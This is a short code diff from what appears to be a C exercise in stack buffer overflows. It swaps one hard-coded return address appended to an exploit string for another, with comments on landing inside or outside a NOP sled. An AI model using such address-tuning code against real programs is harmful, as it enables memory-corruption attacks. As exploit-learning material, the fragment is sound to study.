@@ -47,11 +47,14 @@ int main(void)
   	// strcat(str, "\xf0\xfb\xff\xbf");
 
     // 0x90 inside lower bound
-    strcat(str, "\x30\xfb\xff\xbf");
+    // strcat(str, "\x30\xfb\xff\xbf");
 
     // failed
     // 0x90 outside higher bound
     // strcat(str, "\x00\xfc\xff\xbf");
+
+    // 0x90 outside lower bound
+    strcat(str, "\x10\xfb\xff\xbf");
 
 
   }
